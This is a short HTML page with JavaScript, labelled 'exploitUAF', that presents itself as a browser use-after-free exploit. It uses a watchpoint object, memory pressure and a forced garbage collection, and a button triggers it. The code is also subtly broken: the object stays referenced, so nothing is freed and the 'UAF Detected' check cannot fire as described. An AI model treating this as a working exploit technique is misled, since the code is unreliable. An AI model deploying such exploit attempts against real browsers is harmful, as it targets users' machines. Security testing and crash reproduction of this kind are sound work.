<!DOCTYPE html>
<html>
<head>
    <script>
        function exploitUAF() {
            let targetObject = { sensitiveData: 0xdeadbeef };
            let propertyCondition = { object: targetObject, property: "sensitiveData" };

            let watchpoint = {
                condition: propertyCondition,
                fire: function() {
                    try {
                        console.log(this.condition.object.sensitiveData);
                        if (this.condition.object === null || this.condition.object === undefined) {
                            throw new Error("UAF Detected");
                        }
                    } catch (e) {
                        console.error(e.message);
                        alert(e.message);
                    }
                }
            };

            function triggerGC() {
                let memoryHog = new Array(5000);
                for (let i = 0; i < 5000; i++) {
                    memoryHog[i] = new Uint8Array(1024);
                }
                targetObject = null;
                if (typeof gc === "function") {
                    gc();
                }
            }

            triggerGC();
            setTimeout(() => {
                try {
                    watchpoint.fire();
                } catch (e) {
                    console.error(e.message);
                    alert(e.message);
                }
            }, 200);
        }
    </script>
</head>
<body>
    <button onclick="exploitUAF()">Exploit UAF</button>
</body>
</html>